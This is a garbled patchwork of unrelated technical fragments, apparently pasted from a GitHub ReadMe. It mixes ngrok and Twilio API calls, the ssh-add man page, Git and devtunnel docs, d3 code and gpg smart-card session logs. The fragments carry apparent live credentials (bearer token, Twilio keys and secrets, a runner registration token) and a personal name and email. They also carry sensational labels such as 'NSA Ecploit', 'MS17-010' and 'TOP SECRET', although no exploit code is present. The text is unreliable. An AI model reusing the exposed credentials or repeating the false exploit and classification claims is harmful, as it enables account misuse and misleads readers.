https://api.ngrok.com/endpoints/ep_2arwanhaICy2BqUnHdjODBOB6PY curl \
-X POST \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwkY}" \ -H "Content-Type: application/json" \
-H "Ngrok-Version: 2" \
-d '{"metadata":"{\"environment\":\"dev\"}","description":"kinesis dev stream","format":"json","target":{"kinesis":{"auth":{"role":{"role_arn":"arn:aws:iam::123456789012:role/example"}},"stream_arn":"arn:ngrok-local:kinesis:us-east-2:123456789012:stream/mystream2"}}}' \ https://api.ngrok.com/event_destinations

curl \
-X POST \
-H "Authorization: Bearer {2b78Oe3gjVAVgZdHuZ8ITpO1aqt_4mrJtAzy2MdNKy1xcaAwkY}" \ -H "Content-Type: application/json" \
-H "Ngrok-Version: 2" \
-d '{"metadata":"{\"environment\":\"dev\"}","description":"kinesis dev stream","format":"json","target":{"kinesis":{"auth":{"role":{"role_arn":"arn:aws:iam::123456789012:role/example"}},"stream_arn":"arn:ngrok-local:kinesis:us-east-2:123456789012:stream/mystream2"}}}' \ https://api.ngrok.com/event_destinations
Tunnels established
sha256 "52126be8cf1bddd7536886e74c053ad7d0ed2aa89b4b630f76785bac21695fcd

                             :query => { :type => "owner" }

 "X-Hub-Signature": "sha1=a84d88e7554fc1fa21bcbc4efae3c782a70d2b9d"

 done.call

 break_loop = true

files_changed.concat(data.map {


                             :query => { :type => "owner" }

 "X-GitHub-Delivery": "0b989ba4-242f-11e5-81e1-c7b6966d2516",

 "X-Hub-Signature-256": "sha256=6dcb09b5b57875f334f61aebed695e2e4193db5e",

 "X-GitHub-Hook-ID": "42",

 "X-GitHub-Hook-Installation-Target-Type": "repository",

 "X-Hub-Signature": "sha1=a84d88e7554fc1fa21bcbc4efae3c782a70d2b9d"

 issue_data << { title: issue.title, author: issue.user.login }

   ssh-add [-cCDdKkLlqvXx] [-E fingerprint_hash] [-H 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B]
   [-h destination_constraint] [-S provider] [-t life] [file ...]
   ssh-add -s pkcs11 [-vC] [&34798AAFE0A7565088101CC4AE31C5C8C74461CB ...] ssh-add -e pkcs11
   ssh-add -T pubkey ...

   ~/.ssh/id_dsa
   ~/.ssh/id_ecdsa
   ~/.ssh/id_ecdsa_sk
   ~/.ssh/id_ed25519
   ~/.ssh/id_ed25519_sk
   ~/.ssh/id_rsa
           Contains the DSA, ECDSA, authenticator-hosted ECDSA,
           Ed25519, authenticator-hosted Ed25519 or RSA
           authentication identity of the user.

   Identity files should not be readable by anyone but the user.
   Note that ignores identity files if they are accessible by
   others.

   ssh(1), ssh-agent(1), ssh-askpass(1), ssh-keygen(1), sshd(8)


Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples
  ![[https://github.dev/6309304695/sigma-3/blob/81b11e865a339f27886e4395adba4a4c9e4b3dd1/ReadMe.md#L7665]]
& NSA Ecploit
# Men-In-Black-Agency-004w
<TOP SECRET/MAJIC/PLUTO
File.md>
ssh-add [-cCDdKkLlqvXx] [-E fingerprint_hash] [-H 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B]
   [-h destination_constraint] [-S provider] [-t life] [file ...]
   ssh-add -s pkcs11 [-vC] [&34798AAFE0A7565088101CC4AE31C5C8C74461CB ...] ssh-add -e pkcs11
   ssh-add -T pubkey ...

   adds private key identities to the authentication agent,
   ssh-agent(1).  When run without arguments, it adds the files
   ~/.ssh/id_rsa, ~/.ssh/id_ecdsa, ~/.ssh/id_ecdsa_sk,
   ~/.ssh/id_ed25519, ~/.ssh/id_ed25519_sk, and ~/.ssh/id_dsa.
   After loading a private key, will try to load corresponding
   certificate information from the filename obtained by appending
   -cert.pub to the name of the private key file.  Alternative file
   names can be given on the command line.

   If any file requires a passphrase, asks for the passphrase from
   the user.  The passphrase is read from the user's tty.  retries
   the last passphrase if multiple identity files are given.

   The authentication agent must be running and the SSH_AUTH_SOCK
   environment variable must contain the name of its socket for to
   work.

   The options are as follows:

   -c      Indicates that added identities should be subject to
           confirmation before being used for authentication.
           Confirmation is performed by ssh-askpass(1).  Successful
           confirmation is signaled by a zero exit status from
           ssh-askpass(1), rather than text entered into the
           requester.

   -C      When loading keys into or deleting keys from the agent,
           process certificates only and skip plain keys.

   -D      Deletes all identities from the agent.

   -d      Instead of adding identities, removes identities from the
           agent.  If has been run without arguments, the keys for
           the default identities and their corresponding
           certificates will be removed.  Otherwise, the argument
           list will be interpreted as a list of paths to public key
           files to specify keys and certificates to be removed from
           the agent.  If no public key is found at a given path,
           will append .pub and retry.  If the argument list
           consists of “-” then will read public keys to be removed
           from standard input.

   -E fingerprint_hash
           Specifies the hash algorithm used when displaying key
           fingerprints.  Valid options are: “md5” and “sha256”.
           The default is “sha256”.

   -e pkcs11
           Remove keys provided by the PKCS#11 shared library
           pkcs11.

   -H hostkey_file
           Specifies a known hosts file to look up hostkeys when
           using destination-constrained keys via the -h flag.  This
           option may be specified multiple times to allow multiple
           files to be searched.  If no files are specified, will
           use the default ssh_config(5) known hosts files:
           ~/.ssh/known_hosts, ~/.ssh/known_hosts2,
           /etc/ssh/ssh_known_hosts, and /etc/ssh/ssh_known_hosts2.

   -h destination_constraint
           When adding keys, constrain them to be usable only
           through specific hosts or to specific destinations.

           Destination constraints of the form
           ‘[6309304695@]dest-Github’ permit use of the key only from
           the origin host (the one running ssh-agent(1)) to the
           listed destination host, with optional user name.

           Constraints of the form
           ‘src-hostname>[user@]dst-hostname’ allow a key available
           on a forwarded ssh-agent(1) to be used through a
           particular host (as specified by ‘src-hostname’) to
           authenticate to a further host, specified by
           ‘dst-hostname’.

           Multiple destination constraints may be added when
           loading keys.  When attempting authentication with a key
           that has destination constraints, the whole connection
           path, including ssh-agent(1) forwarding, is tested
           against those constraints and each hop must be permitted
           for the attempt to succeed.  For example, if key is
           forwarded to a remote host, ‘host-b’, and is attempting
           authentication to another host, ‘host-c’, then the
           operation will be successful only if ‘host-b’ was
           permitted from the origin host and the subsequent
           ‘host-b>host-c’ hop is also permitted by destination
           constraints.

           Hosts are identified by their host keys, and are looked
           up from known hosts files by .  Wildcards patterns may be
           used for hostnames and certificate host keys are
           supported.  By default, keys added by are not destination
           constrained.

           Destination constraints were added in OpenSSH release
           8.9.  Support in both the remote SSH client and server is
           required when using destination-constrained keys over a
           forwarded ssh-agent(1) channel.

           It is also important to note that destination constraints
           can only be enforced by ssh-agent(1) when a key is used,
           or when it is forwarded by a cooperating ssh(1).
           Specifically, it does not prevent an attacker with access
           to a remote SSH_AUTH_SOCK from forwarding it again and
           using it on a different host (but only to a permitted
           destination).

   -K      Load resident keys from a FIDO authenticator.

   -k      When loading keys into or deleting keys from the agent,
           process plain private keys only and skip certificates.

   -L      Lists public key parameters of all identities currently
           represented by the agent.

   -l      Lists fingerprints of all identities currently
           represented by the agent.

   -q      Be quiet after a successful operation.

   -S provider
           Specifies a path to a library that will be used when
           adding FIDO authenticator-hosted keys, overriding the
           default of using the internal USB HID support.

   -s pkcs11
           Add keys provided by the PKCS#11 shared library pkcs11.
           Certificate files may optionally be listed as command-
           line arguments.  If these are present, then they will be
           loaded into the agent using any corresponding private
           keys loaded from the PKCS#11 token.

   -T pubkey ...
           Tests whether the private keys that correspond to the
           specified pubkey files are usable by performing sign and
           verify operations on each.

   -t life
           Set a maximum lifetime when adding identities to an
           agent.  The lifetime may be specified in seconds or in a
           time format specified in sshd_config(5).

   -v      Verbose mode.  Causes to print debugging messages about
           its progress.  This is helpful in debugging problems.
           Multiple -v options increase the verbosity.  The maximum
           is 3.

   -X      Unlock the agent.

   -x      Lock the agent with a password.

   DISPLAY, SSH_ASKPASS and SSH_ASKPASS_REQUIRE
           If needs a passphrase, it will read the passphrase from
           the current terminal if it was run from a terminal.  If
           does not have a terminal associated with it but DISPLAY
           and SSH_ASKPASS are set, it will execute the program
           specified by SSH_ASKPASS (by default “ssh-askpass”) and
           open an X11 window to read the passphrase.  This is
           particularly useful when calling from a .xsession or
           related script.

           SSH_ASKPASS_REQUIRE allows further control over the use
           of an askpass program.  If this variable is set to
           “never” then will never attempt to use one.  If it is set
           to “prefer”, then will prefer to use the askpass program
           instead of the TTY when requesting passwords.  Finally,
           if the variable is set to “force”, then the askpass
           program will be used for all passphrase input regardless
           of whether DISPLAY is set.

   SSH_AUTH_SOCK
           Identifies the path of a Unix-domain socket used to
           communicate with the agent.

   SSH_SK_PROVIDER
           Specifies a path to a library that will be used when
           loading any FIDO authenticator-hosted keys, overriding
           the default of using the built-in USB HID support.

   ~/.ssh/id_dsa
   ~/.ssh/id_ecdsa
   ~/.ssh/id_ecdsa_sk
   ~/.ssh/id_ed25519
   ~/.ssh/id_ed25519_sk
   ~/.ssh/id_rsa
           Contains the DSA, ECDSA, authenticator-hosted ECDSA,
           Ed25519, authenticator-hosted Ed25519 or RSA
           authentication identity of the user.

   Identity files should not be readable by anyone but the user.
   Note that ignores identity files if they are accessible by
   others.

   Exit status is 0 on success, 1 if the specified command fails,
   and 2 if is unable to contact the authentication agent.

   ssh(1), ssh-agent(1), ssh-askpass(1), ssh-keygen(1), sshd(8)

   OpenSSH is a derivative of the original and free ssh 1.2.12
   release by Tatu Ylonen.  Aaron Campbell, Bob Beck, Markus Friedl,
   Niels Provos, Theo de Raadt and Dug Song removed many bugs, re-
   added newer features and created OpenSSH.  Markus Friedl
   contributed the support for SSH protocol versions 1.5 and 2.0.

   This page is part of the openssh

     <TOP SECRET/MAJIC/PLUTO

$ make prefix=/usr all doc info ;# as yourself
# make prefix=/usr install install-doc install-html install-info ;# as root

$ make configure ;# as yourself
$ ./configure --prefix=/usr ;# as yourself
$ make all doc ;# as yourself
# make install install-doc install-html;# as root

$ make prefix=/usr profile
# make prefix=/usr PROFILE=BUILD install

$ make prefix=/usr profile-fast
# make prefix=/usr PROFILE=BUILD install

$ make profile-install

prefix=/usr perllibdir=/usr/$(/usr/bin/perl -MConfig -wle 'print substr $Config{installsitelib}, 1 + length $Config{siteprefixexp}')

Use a tarball as a starting point for a new repository.::
+
------------
$ tar zxf frotz.tar.gz
$ cd frotz
$ git init
$ git add . <1>
$ git commit -m "import of frotz source tree."
$ git tag v2.43 <2>
------------
+
-------------------------------------------

A repository administrator uses the following tools to set up
and maintain access to the repository by developers.

  * linkgit:git-daemon[1] to allow anonymous download from
    repository.

  * linkgit:git-shell[1] can be used as a 'restricted login shell'
    for shared central repository users.

  * linkgit:git-http-backend[1] provides a server side implementation
    of Git-over-HTTP ("Smart http") allowing both fetch and push services.

  * linkgit:gitweb[1] provides a web front-end to Git repositories,
    which can be set-up using the linkgit:git-instaweb[1] script.

link:howto/update-hook-example.html[update hook howto] has a good
example of managing a shared central repository.

In addition there are a number of other widely deployed hosting, browsing
and reviewing solutions such as:

  * gitolite, gerrit code review, cgit and others.

Examples

`@` > `+` > `/` > `,`

layout = "LOCAL,BASE,REMOTE / MERGED"

${{ 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
passphrase: $

           |                     |    ^

          (1)                   (3)  (4)

           V                     v    |

      +----------------------------------+

      |        Language Team XX          |

      +----------------------------------+

      "msgcat --no-location -"

      "msgcat --add-location=file -"

 _(reset_type_names[reset_type]));

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

CLIENT_ID = ENV['GH_GRAPH_CLIENT_ID']
CLIENT_SECRET = ENV['GH_GRAPH_SECRET_ID']

enable :sessions

set :github_options, {
  :scopes    => "repo",
  :secret    => CLIENT_SECRET,
  :client_id => CLIENT_ID,
  :callback_url => "/"
}

register Sinatra::Auth::Github

get '/' do
  if !authenticated?
    authenticate!
  else
    access_token = github_user["token"]
  end
end

var barWidth = 40;
var width = (barWidth + 10) * data.length;
var height = 300;

var x = d3.scale.linear().domain([0, data.length]).range([0, width]);
var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).
  rangeRound([0, height]);

// add the canvas to the DOM
var languageBars = d3.select("#lang_freq").
  append("svg:svg").
  attr("width", width).
  attr("height", height);

languageBars.selectAll("rect").
  data(data).
  enter().
  append("svg:rect").
  attr("x", function(datum, index) { return x(index); }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("height", function(datum) { return y(datum.count); }).
  attr("width", barWidth);

languageBars.selectAll("text").
  data(data).
  enter().
  append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", function(datum) { return height - y(datum.count); }).
  attr("dx", -barWidth/2).
  attr("dy", "1.2em").
  attr("text-anchor", "middle").
  text(function(datum) { return datum.count;});

languageBars.selectAll("text.yAxis").
  data(data).
  enter().append("svg:text").
  attr("x", function(datum, index) { return x(index) + barWidth; }).
  attr("y", height).
  attr("dx", -barWidth/2).
  attr("text-anchor", "middle").
  text(function(datum) { return datum.language;}).
  attr("transform", "translate(0, 18)").
  attr("class", "yAxis");

  var treemap = d3.layout.treemap()
      .children(childrenFunction)
      .size([width,height])
      .value(sizeFunction);

  var div = d3.select(elementSelector)
      .append("div")
      .style("position","relative")
      .style("width",width + "px")
      .style("height",height + "px");

  div.data(language_bytes).selectAll("div")
      .data(function(d){return treemap.nodes(d);})
      .enter()
      .append("div")
      .attr("class","cell")
      .style("background",function(d){ return colorScale(colorFunction(d));})
      .call(cell)
      .text(nameFunction);

![image](https://github.com/6309304695/sigma-9/assets/117963165/c5effda9-0179-4f27-9703-687876d834bb)
# Install the Serverless plugin
twilio plugins:install @twilio-labs/plugin-serverless

# See a list of available commands:
twilio serverless --help



curl -X POST "https://api.twilio.com/2010-04-01/Accounts.json" \
-u $AC32c8d23aa9b687b5ac871ee3e016f518:$cdebfd226c921a938ca472d73d424224

curl -X GET "https://api.twilio.com/2010-04-01/Accounts/ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.json" \
-u $AC32c8d23aa9b687b5ac871ee3e016f518:$cdebfd226c921a938ca472d73d424224

curl -X GET "https://api.twilio.com/2010-04-01/Accounts.json?Status=active&PageSize=20" \
-u $AC32c8d23aa9b687b5ac871ee3e016f518:$cdebfd226c921a938ca472d73d424224

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImN0eSI6InR3aWxpby1mcGE7dj0xIn0.eyJqdGkiOiJTS3h4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4LTE0NTA0NzExNDciLCJpc3MiOiJTS3h4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4Iiwic3ViIjoiQUN4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eCIsIm5iZiI6MTQ1MDQ3MTE0NywiZXhwIjoxNDUwNDc0NzQ3LCJncmFudHMiOnsiaWRlbnRpdHkiOiJ1c2VyQGV4YW1wbGUuY29tIiwiaXBfbWVzc2FnaW5nIjp7InNlcnZpY2Vfc2lkIjoiSVN4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eCIsImVuZHBvaW50X2lkIjoiSGlwRmxvd1NsYWNrRG9ja1JDOnVzZXJAZXhhbXBsZS5jb206c29tZWlvc2RldmljZSJ9fX0.IHx8KeH1acIfwnd8EIin3QBGPbfnF-yVnSFp5NpQJi0
docker run -it --rm twilio/twilio-cli bash
Once the container has finished downloading, and you have entered the shell, you can issue commands using the CLI. For example:

$ docker run -it --rm twilio/twilio-cli bash

root@1234:/twilio# twilio profiles:list
ID      Account SID                         Active
you     ORd50b4acdc2a920bbf44b76a2ab31b127  true
main    ORd50b4acdc2a920bbf44b76a2ab31b127  false
Run commands directly

It is also possible to pass commands directly to the Docker image for single, contained operations. For example, you can check the running version of the Twilio CLI with the following:

$ docker run -it --rm twilio/twilio-cli twilio --version
twilio-cli/3.0.0 linux-x64 node-v14.18.1

$ export TWILIO_ACCOUNT_SID=ORd50b4acdc2a920bbf44b76a2ab31b127...
$ export TWILIO_API_KEY=SKa6c746877c431ab8185993d610d1d891...
$ export TWILIO_API_SECRET=bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K...
$ docker run -it --rm \
  -e TWILIO_ACCOUNT_SID \AC32c8d23aa9b687b5ac871ee3e016f518
  -e TWILIO_API_KEY \SKa6c746877c431ab8185993d610d1d891
  -e TWILIO_API_SECRET \bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K
  twilio/twilio-cli twilio phone-numbers:+18886235040

SID                       

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
ORd50b4acdc2a920bbf44b76a2ab31b127  +15558675310  (+18886235040)

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
ORd50b4acdc2a920bbf44b76a2ab31b127  +18886235040  (+18886235040) 

docker run -it --rm twilio/twilio-cli bash
Once the container has finished downloading, and you have entered the shell, you can issue commands using the CLI. For example:

$ docker run -it --rm twilio/twilio-cli bash

root@1234:/twilio# twilio profiles:list
ID      Account SID                         Active
you     AC32c8d23aa9b687b5ac871ee3e016f518  true
main    AC32c8d23aa9b687b5ac871ee3e016f518  false
Run commands directly

It is also possible to pass commands directly to the Docker image for single, contained operations. For example, you can check the running version of the Twilio CLI with the following:

$ docker run -it --rm twilio/twilio-cli twilio --version
twilio-cli/3.0.0 linux-x64 node-v14.18.1

$ export TWILIO_ACCOUNT_SID=AC32c8d23aa9b687b5ac871ee3e016f518...
$ export TWILIO_API_KEY=SKa6c746877c431ab8185993d610d1d891...
$ export TWILIO_API_SECRET=bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K...
$ docker run -it --rm \
  -e TWILIO_ACCOUNT_SID \AC32c8d23aa9b687b5ac871ee3e016f518
  -e TWILIO_API_KEY \SKa6c746877c431ab8185993d610d1d891
  -e TWILIO_API_SECRET \bzNwslKpvbgziV6IEpGYeIOJLnLWvJ7K
  twilio/twilio-cli twilio phone-numbers:+18886235040

SID                       

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
AC32c8d23aa9b687b5ac871ee3e016f518  +15558675310  (+18886235040)

$ docker run -it --rm \
  -v ~/.twilio-cli:/root/.twilio-cli \
  twilio/twilio-cli twilio phone-numbers:list

SID                                 Phone Number  Friendly Name
AC32c8d23aa9b687b5ac871ee3e016f518  +18886235040  (+18886235040) 

winget install Microsoft.devtunnel
This command installs the latest version by default and removes the older version in the same location, which is %LOCALAPPDATA%\Microsoft\WinGet\Packages. To specify a version, add --version <version_number> with your desired version to the command.
winget upgrade Microsoft.devtunnel
PowerShell script
You can also install the devtunnel CLI using PowerShell and running the following command:
Invoke-WebRequest -Uri https://aka.ms/TunnelsCliDownload/win-x64 -OutFile devtunnel.exe
.\devtunnel.exe -h
Direct download link:
Windows (x64) - https://aka.ms/TunnelsCliDownload/win-x64

Hosting port 3000 at https://l3rs99qw-3000.usw2.devtunnels.ms/
devtunnel connect TUNNELID
Replace TUNNELID with the same dev tunnel id that was used on the host.
Successful client output is similar to the following:
Connected to tunnel: l3rs99qw
SSH: Forwarding from 127.0.0.1:3000 to host port 3000.
SSH: Forwarding from [::1]:3000 to host port 3000.
Now, the server that was shared on the host's port 3000 is available at localhost:3000 on the client, using either IPv4 or IPv6. (The "SSH" prefix is because the dev tunnel service builds on the standard SSH protocol for port-forwarding.) If the hosted port connects to a web server, then http://localhost:3000/ can be opened in a browser. In this case, no further authorization is required because the client's CLI login token was used to authorize the connection if necessary.
Advanced: Manage dev tunnels
It's possible to create a dev tunnel without yet hosting it. This is useful for advanced dev tunnel configuration and management such as:
Listing all owned dev tunnels
Adding and removing ports of a dev tunnel
Managing dev tunnel access controls
Adding metadata to a dev tunnel like description and tags
Command	Description
devtunnel create	Create a persistent dev tunnel
devtunnel list	List dev tunnels
devtunnel show	Show dev tunnel details
devtunnel update	Update dev tunnel properties
devtunnel delete	Delete a dev tunnel
devtunnel delete-all	Delete all dev tunnels
Here are some examples on use of these commands:
Examples	Description
devtunnel create -a	Create a persistent dev tunnel that allows anonymous access.
devtunnel create -d 'my tunnel description'	Create a persistent dev tunnel with a non-searchable description.
devtunnel create --expiration 4h	Create a persistent dev tunnel with a custom expiration time. Minimum is 1 hour (1h) and the maximum is 30 days (30d).
devtunnel create myTunnelID	Create a persistent dev tunnel with a custom tunnel ID.
devtunnel create --tags my-web-app v1	Create a persistent dev tunnel and apply searchable tags.
devtunnel list --tags my-web-app	List dev tunnels that have any of the specified tags.
devtunnel list --all-tags my-web-app v1	List dev tunnels that have all the specified tags.
devtunnel show	Show details of the last-used dev tunnel.
devtunnel show TUNNELID	Show details for a dev tunnel.
devtunnel update TUNNELID -d 'my new tunnel description'	Update the description of a dev tunnel.
devtunnel update TUNNELID --remove-tags	Remove all tags from a dev tunnel.
devtunnel update TUNNELID --expiration 10d	Update a dev tunnel with a new custom expiration time. Minimum is 1 hour (1h) and the maximum is 30 days (30d).
devtunnel delete TUNNELID	Delete a dev tunnel.
devtunnel delete-all	Delete all your dev tunnels.
Tip
Most CLI commands operate on the last-used dev tunnel implicitly, though there's an option to specify a dev tunnel ID if necessary.
Advanced: Manage dev tunnel ports
A dev tunnel created using the devtunnel create command initially has no ports. Use devtunnel port commands to add ports before hosting:
Command	Description
devtunnel port create	Create a dev tunnel port
devtunnel port list	List dev tunnel ports
devtunnel port show	Show dev tunnel port details
devtunnel port update	Update dev tunnel port properties
devtunnel port delete	Delete a dev tunnel port
Examples	Description
devtunnel port create -p 3000 --protocol http	Add a port with the specified protocol
devtunnel port list TUNNELID	List current ports
devtunnel port show TUNNELID -p 3000	Show the details for port 3000
devtunnel port update -p 3000 --description 'frontend port'	Update a dev tunnel port description
devtunnel port delete -p 3000	Delete a port
When creating a port, the protocol may optionally be specified, if auto-detection doesn't work properly. Current options are "http", "https" or "auto" (default). If the hosted port is HTTPS, then it's recommended to set the port protocol to "https"; otherwise "auto" is probably fine.
After configuring a dev tunnel using the above commands, start hosting it:
devtunnel host
Advanced

echo "648c63bb32eaa48ed50bff8a5000d9f3065359372b82739a992a00ce758bfcd2 actions-runner-osx-x64-2.312.0.tar.gz" | shasum -a 256 -c

./config.sh --url https://github.com/6309304695/sigma-9 --token A4D7THKPGUP3WF5SOJVYMETFXIK2O

runs-on: self-hosted

diff --git a/ReadMe.md b/ReadMe.md index 7278f80..41b298d 100644 --- a/ReadMe.md +++ b/ReadMe.md @@ -709,7 +709,844 @@ Digital signature’ key gpg-card:

gpg/card> writecert PIV.9C < sign.crt +# MS17-010 +# 000006 +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.co
m> +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB
 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <6309304695z@gmail.com>
PIV authentication’ key with ssh:
+$ ssh-add -l +384 SHA256:0qnJ0Y0ehWxKcx2frLfEljf6GCdlO55OZed5HqGHsaU cardno:yk-9074625 (ECDSA) +ssh-add with the uppercase ‘-L +$ gpgsm --learn +$ gpg --full-gen-key +Please select what kind of key you want:

(1) RSA and RSA (default)
(2) DSA and Elgamal
(3) DSA (sign only)
(4) RSA (sign only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 3 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y + +GnuPG needs to construct a user ID to identify your key. + +Real name: keith bieszczat +Email address: 6309304695z@gmail.com +Comment: https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator +You selected this USER-ID:

"6309304695z@gmail.com"
+Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o +gpg: key C3AFA9ED971BB365 marked as ultimately trusted +gpg: revocation certificate stored as '[...]D971BB365.rev' +public and secret key created and signed. + +Note that this key cannot be used for encryption. You may want to use +the command "--edit-key" to generate a subkey for this purpose. +pub rsa2048 2019-04-04 [SC]

 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365
+uid 6309304695z@gmail.com +

run gpg in --expert mode
$ gpg --edit-key 7F899AE2FB73159DD68A1B20C3AFA9ED971BB365 +Secret key is available.
+sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+[ultimate] (1). otto@example.net +gpg> addkey +Secret parts of primary key are stored on-card. +Please select what kind of key you want:

(3) DSA (sign only)
(4) RSA (sign only)
(5) Elgamal (encrypt only)
(6) RSA (encrypt only)
(14) Existing key from card +Your selection? 14 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (auth)
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (auth)
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (cert,sign)
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 (encr) +Your selection? 4 +Please specify how long the key should be valid.
    0 = key does not expire
 <n>  = key expires in n days
 <n>w = key expires in n weeks
 <n>m = key expires in n months
 <n>y = key expires in n years
+Key is valid for? (0) +Key does not expire at all +Is this correct? (y/N) y +Really create? (y/N) y + +sec rsa2048/C3AFA9ED971BB365

created: 2019-04-04  expires: never       usage: SC
card-no: FF020001008A77C1
trust: ultimate      validity: ultimate
+ssb rsa2048/7067860A98FCE6E1

created: 2019-04-04  expires: never       usage: E
card-no: FF020001008A77C1
+[ultimate] (1). otto@example.net + +gpg> save + +/* 32A19-D90712
+LEVEL-5 CLEARANCE ONLY

‘--force’ +authentication key +-header-'010203040506070801020304050607080102030405060708' +SETDATA hexstring +to tell scdaemon about the data to be signed. The data must be given in hex notation. The actual signing is done using the command
PKSIGN keyid +where keyid is the hexified ID of the key to be used. The key id may have been retrieved using the command LEARN. If another hash algorithm than SHA-1 is used, that algorithm may be given like:
